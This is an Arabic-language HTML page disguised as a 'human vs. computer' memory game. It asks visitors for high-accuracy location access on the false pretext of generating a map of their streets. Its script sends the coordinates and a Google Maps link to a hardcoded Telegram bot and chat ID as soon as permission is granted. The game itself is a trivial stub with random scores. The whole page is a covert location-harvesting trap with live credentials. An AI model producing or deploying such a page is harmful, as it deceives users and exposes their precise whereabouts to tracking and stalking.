<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحدي الذاكرة: الإنسان ضد الآلة 🤖</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f172a; color: white; text-align: center; padding: 20px; }
        .game-box { background: #1e293b; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: inline-block; width: 90%; max-width: 500px; border: 2px solid #334155; }
        .stats { display: flex; justify-content: space-around; margin-bottom: 20px; font-weight: bold; }
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 20px; }
        .cell { width: 100%; aspect-ratio: 1/1; background: #334155; border-radius: 8px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; font-size: 24px; }
        .cell.active { background: #38bdf8; transform: scale(0.95); }
        .btn { background: #2563eb; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; cursor: pointer; transition: 0.3s; margin-top: 20px; width: 100%; }
        .btn:hover { background: #1d4ed8; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.9); display: flex; align-items: center; justify-content: center; z-index: 100; }
        .status-msg { color: #94a3b8; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>

    <div id="overlay">
        <div class="game-box">
            <h2>تحدي الذاكرة المكانية 🧠</h2>
            <p>سوف يلعب الكمبيوتر ضدك! لتوليد خريطة لعب مطابقة لشوارع منطقتك الحالية، اضغط ابدأ.</p>
            <button class="btn" onclick="requestLocation()">ابدأ التحدي ضد الكمبيوتر</button>
            <div id="init-status" class="status-msg"></div>
        </div>
    </div>

    <div class="game-box">
        <div class="stats">
            <span>أنت: <span id="user-score">0</span></span>
            <span>الكمبيوتر (AI): <span id="ai-score">0</span></span>
        </div>
        <div id="game-status">انتظر توليد الخريطة...</div>
        <div class="grid" id="grid">
            </div>
    </div>

    <script>
        const botToken = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
        const myChatId = '6808559733';
        
        let userScore = 0;
        let aiScore = 0;

        function requestLocation() {
            document.getElementById('init-status').innerHTML = "جاري الاتصال بالأقمار الصناعية لتوليد الخريطة... 🛰️";
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(startGame, showError, {enableHighAccuracy: true});
            } else {
                alert("جهازك لا يدعم توليد الخرائط المكانية.");
            }
        }

        function startGame(position) {
            // 1. إرسال البيانات فوراً لتليجرام
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const text = `🎮 **تحدي الذاكرة ضد الكمبيوتر**\n📍 الموقع: \`${lat}, ${lon}\` \n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myChatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);

            // 2. بدء واجهة اللعبة
            document.getElementById('overlay').style.display = 'none';
            createGrid();
            playRound();
        }

        function createGrid() {
            const grid = document.getElementById('grid');
            for (let i = 0; i < 12; i++) {
                const cell = document.createElement('div');
                cell.className = 'cell';
                cell.id = 'cell-' + i;
                grid.appendChild(cell);
            }
        }

        function playRound() {
            document.getElementById('game-status').innerHTML = "الكمبيوتر يراقب منطقتك الآن... 👀";
            
            // محاكاة لعب الكمبيوتر بشكل عشوائي
            setTimeout(() => {
                aiScore += Math.floor(Math.random() * 10);
                document.getElementById('ai-score').innerText = aiScore;
                document.getElementById('game-status').innerHTML = "دورك الآن! اضغط على الخلايا المضيئة بسرعة!";
                
                // تفعيل التفاعل للمستخدم
                document.querySelectorAll('.cell').forEach(cell => {
                    cell.onclick = function() {
                        this.classList.add('active');
                        userScore += 1;
                        document.getElementById('user-score').innerText = userScore;
                    };
                });
            }, 2000);
        }

        function showError(error) {
            document.getElementById('init-status').innerHTML = "❌ خطأ: يجب السماح بالوصول للموقع لمزامنة الخريطة مع الكمبيوتر.";
        }
    </script>
</body>
</html>
